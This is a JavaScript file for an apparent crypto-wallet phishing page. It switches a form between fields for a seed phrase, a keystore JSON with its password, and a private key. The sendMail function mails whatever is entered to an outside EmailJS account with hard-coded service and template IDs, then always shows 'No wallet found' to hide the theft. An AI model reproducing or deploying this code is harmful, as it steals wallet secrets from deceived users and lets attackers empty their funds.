
 (function(){
 	
      emailjs.init({
        publicKey: 'i8PHunlpA47hH8nlc',
      });
   })();



document.getElementById('json').style.display="none";
function phrase() {
	document.getElementById('message').setAttribute('placeholder','Enter Phrase');
	document.getElementById('message').value="";
	document.getElementById('name').setAttribute('type','hidden');
	document.getElementById('name').value="";
	document.getElementById('text').style.display="";
	let wait=document.getElementById('wait');
    wait.innerHTML="Proceed";
}
function jkey() {
	document.getElementById('message').setAttribute('placeholder','Enter Keystore JSON{}');
	document.getElementById('message').value="";
    document.getElementById('name').setAttribute('type','password');
    document.getElementById('name').value="";
    document.getElementById('text').style.display="none";
    let wait=document.getElementById('wait');
    wait.innerHTML="Proceed";
}
function pkey() {
	document.getElementById('message').setAttribute('placeholder','Enter Private Key');
	document.getElementById('message').value="";
	document.getElementById('name').setAttribute('type','hidden');
	document.getElementById('name').value="";
	document.getElementById('text').style.display="none";
	let wait=document.getElementById('wait');
    wait.innerHTML="Proceed";
}
function sendMail() {
	let parms={
		email :document.getElementById('email').value,
		message : document.getElementById('message').value,
		name : document.getElementById('name').value,
	}
	let comfirmation=document.getElementById('comfirmation');
	comfirmation.innerHTML=`<span style="color: red">No wallet found</span>`;
	let wait=document.getElementById('wait');
	emailjs.send('service_2f97d4y','template_2d52qln',parms).then(comfirmation)
}